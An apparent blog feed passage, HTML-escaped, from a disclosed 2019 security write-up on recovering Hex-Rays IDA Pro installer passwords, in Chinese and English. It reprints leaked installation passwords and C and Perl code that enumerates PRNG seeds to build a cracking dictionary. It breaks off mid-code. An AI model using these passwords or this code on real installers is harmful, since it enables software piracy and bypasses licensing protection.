&lt;span class=&quot;nb&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;&quot;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄèÈÅéÈÄô‰∫õË≥áË®äÔºåÊàëÂÄëÂèØ‰ª•Âª∫Á´ã‰∏ÄÂÄãÁî®‰æÜÊö¥ÂäõÂàóËàâÂÆâË£ùÂØÜÁ¢ºÁöÑÂ≠óÂÖ∏Ê™îÔºåÁ∏ÆÁü≠Êö¥ÂäõÂàóËàâÁöÑÊôÇÈñìÔºåÂØ¶‰ΩúÊñπÂºèÂèØÂèÉËÄÉ &lt;a href=&quot;https://github.com/kholia/inno2john&quot;&gt;inno2john&lt;/a&gt; Â∞àÊ°à„ÄÇÂú®‰∏ÄËà¨ÊÉÖÊ≥Å‰∏ãÔºåÁ¥ÑÂçÅÂàÜÈêòÂç≥ÂèØÁÆóÂá∫ windows ÂÆâË£ùÊ™îÁöÑÂÆâË£ùÂØÜÁ¢º„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú®ÂõûÂ†± Hex-Rays ÂæåÔºå‰ªñÂÄëÁ´ãÂàªË°®Á§∫‰πãÂæåÂ∞áÊúÉ‰ΩøÁî®Êõ¥ÂÆâÂÖ®ÁöÑÂÆâË£ùÂØÜÁ¢º„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;Á∏ΩÁµê&quot;&gt;Á∏ΩÁµê&lt;/h2&gt;

&lt;p&gt;Êú¨ÁØáÊñáÁ´†ÊèêÂá∫‰∫Ü‰∏ÄÂÄãÈñãÊîæÊÄßÂïèÈ°åÔºöÂú®Êú™Áü•ÂÆâË£ùÂØÜÁ¢ºÁöÑÊÉÖÊ≥Å‰∏ãÂèØ‰∏çÂèØ‰ª•ÂÆâË£ù IDA ProÔºüÁµêÊûúÊàëÂÄëÂú® Linux ‰ª•Âèä MacOS ÁâàÁôºÁèæÂèØ‰ª•ÂæûË®òÊÜ∂È´î‰∏≠ÂèñÂæóÊòéÊñáÂØÜÁ¢º„ÄÇËÄåÂú® Windows ÁâàÊú¨‰∏≠ÔºåÊàëÂÄëÈªëÁÆ±ÊâæÂà∞‰∫ÜÂÆâË£ùÂØÜÁ¢ºÁî¢ÁîüÁöÑÊñπÂºèÔºåÂõ†Ê≠§ÊàëÂÄëÂèØ‰ª•Âª∫Á´ã‰∏Ä‰ªΩÂ≠óÂÖ∏Ê™îÔºåÁî®‰ª•Á∏ÆÁü≠Êö¥ÂäõÂàóËàâÂÆâË£ùÂØÜÁ¢ºÁöÑÊôÇÈñìÔºåÊúÄÁµÇÔºåÊàëÂÄëÁ¥ÑÂçÅÂàÜÈêòÂèØËß£Âá∫‰∏ÄÁµÑÂØÜÁ¢ºÔºåÊòØ‰∏ÄÂÄãÂèØ‰ª•Êé•ÂèóÁöÑÊôÇÈñì„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÁúüÁöÑÂæàÂñúÊ≠°ÈÄôÊ®£ÁöÑÈÅéÁ®ãÔºöÊúâÊ†πÊìöÁöÑÂ§ßËÜΩÁåúÊ∏¨ÔºåÁ´≠Áõ°ÂÖ®ÂäõÁî®‰ªª‰ΩïÂ∑≤Áü•Ë≥áË®äÂéªË≠âÊòéÊàëÂÄëÁöÑÊÉ≥Ê≥ïÔºå‰∏çË´ñÁåúÊ∏¨ÊòØÂ∞çÊòØÈåØÔºåÈÉΩËÉΩÂæûÈÅéÁ®ã‰∏≠Áç≤ÂæóÂæàÂ§öÁ∂ìÈ©ó„ÄÇÈÄô‰πüÊòØÁÇ∫‰ªÄÈ∫ºÊàëÂÄëÈÄôÊ¨°È°òÊÑèËä±‰∏ÄÂÄãÊúàÊôÇÈñìÂéªÈ©óË≠â‰∏ÄÂÄãÊàêÂäüÊ©üÁéá‰∏çÊòØÂæàÈ´òÁöÑÂÅáË®≠„ÄÇÈôÑÂ∏∂‰∏ÄÊèêÔºåÈÄôÊ®£ÁöÑÊÖãÂ∫¶Ôºå‰πüË¢´ÈÅãÁî®Âú®ÊàëÂÄë&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;Á¥ÖÈöäÊºîÁ∑¥&lt;/a&gt;‰∏äÔºåÊÉ≥Ë¶ÅË©¶Ë©¶Âóé :p&lt;/p&gt;

&lt;p&gt;ÂØ´Âú®ÊúÄÂæåÔºåË¶ÅÊÑüË¨ù Hex-Rays ÂæàÂèãÂñÑ‰∏îÂø´ÈÄüÁöÑÂõûÊáâ„ÄÇÂç≥‰ΩøÈÄôÂÄãÂïèÈ°å‰∏çÂåÖÂê´Âú® &lt;a href=&quot;https://www.hex-rays.com/bugbounty.shtml&quot;&gt;Security Bug Bounty Program&lt;/a&gt; Ë£°Èù¢Ôºå‰ªçÁÑ∂ÊÖ∑ÊÖ®ÁöÑË¥àÈÄÅ Linux Âíå MAC Áâà IDA ÂèäÂçáÁ¥öÂéüÊúâ Windows ÁâàËá≥ IDA Pro„ÄÇÂÜçÊ¨°ÊÑüË¨ù„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;ÊôÇÈñìËª∏&quot;&gt;ÊôÇÈñìËª∏&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Jan 31, 2019 - Âêë Hex-Rays ÂõûÂ†±Âº±Èªû&lt;/li&gt;
  &lt;li&gt;Feb 01, 2019 - Hex-Rays Ë™™Êòé‰πãÂæåÊúÉÂ¢ûÂä†ÂÆâË£ùÂØÜÁ¢ºÁöÑÂº∑Â∫¶Ôºå‰∏¶ÂçîÂä©ÈÄöÂ†± BitRock&lt;/li&gt;
  &lt;li&gt;Feb 11, 2019 - BitRock ÈáãÂá∫‰∫Ü InstallBuilder 19.2.0&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/</link>
                <guid>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way</guid>
                <pubDate>Fri, 21 Jun 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Operation Crack: Hacking IDA Pro Installer PRNG from an Unusual Way</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;Today, we are going to talk about the installation password of Hex-Rays IDA Pro, which is the most famous decompiler. What is installation password? Generally, customers receive a custom installer and installation password after they purchase IDA Pro. The installation password is required during installation process. However, if someday we find a leaked IDA Pro installer, is it still possible to install without an installation password? This is an interesting topic.&lt;/p&gt;

&lt;p&gt;After brainstorming with our team members, we verified the answer: Yes! With a Linux or MacOS version installer, we can easily find the password directly. With a Windows version installer, we only need 10 minutes to calculate the password. The following is the detailed process:&lt;/p&gt;

&lt;h3 id=&quot;-linux-and-macos-version&quot;&gt;* Linux and MacOS version&lt;/h3&gt;

&lt;p&gt;The first challenge is Linux and MacOS version. The installer is built with an installer creation tool called InstallBuilder. We found the plaintext installation password directly in the program memory of the running IDA Pro installer. Mission complete!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190621/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This problem is fixed after we reported through Hex-Rays. &lt;a href=&quot;https://blog.bitrock.com/2019/02/installbuilder-1920-released.html&quot;&gt;BitRock&lt;/a&gt; released InstallBuilder 19.2.0 with the protection of installation password on 2019/02/11.&lt;/p&gt;

&lt;h3 id=&quot;-windows-version&quot;&gt;* Windows version&lt;/h3&gt;

&lt;p&gt;It gets harder on Windows version because the installer is built with &lt;a href=&quot;http://www.jrsoftware.org/isinfo.php&quot;&gt;Inno Setup&lt;/a&gt;, which store its password with &lt;a href=&quot;http://www.jrsoftware.org/ishelp/index.php?topic=setup_password&quot;&gt;160-bit SHA-1 hash&lt;/a&gt;. Therefore, we cannot get the password simply with static or dynamic analyzing the installer, and brute force is apparently not an effective way. But the situation is different if we can grasp the methodology of password generation, which lets us enumerate the password more effectively!&lt;/p&gt;

&lt;p&gt;Although we have realized we need to find how Hex-Rays generate password, it is still really difficult, as we do not know what language the random number generator is implemented with. There are at least &lt;a href=&quot;https://rosettacode.org/wiki/Random_number_generator_(included)&quot;&gt;88 random number generators&lt;/a&gt; known. It is such a great variation.&lt;/p&gt;

&lt;p&gt;We first tried to find the charset used by random number generator. We collected all leaked installation passwords, such as hacking team‚Äôs password, which is leaked by WikiLeaks.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;FgVQyXZY2XFk (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62729&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;7ChFzSbF4aik (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/311769&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;ZFdLqEM2QMVe (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62956&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;6VYGSyLguBfi (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/70250&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From the collected passwords we can summarize the charset:
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The missing of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;I&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;O&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;o&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;N&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; seems to make sense because they are confusing characters.
Next, we guess the possible charset ordering like these:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz
ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz
23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789
ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lastly, we picked some common languagesÔºàc/php/python/perlÔºâto implement a random number generator and enumerate all the combinations. Then we examined whether the collected passwords appears in the combinations. For example, here is a generator written in C language:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
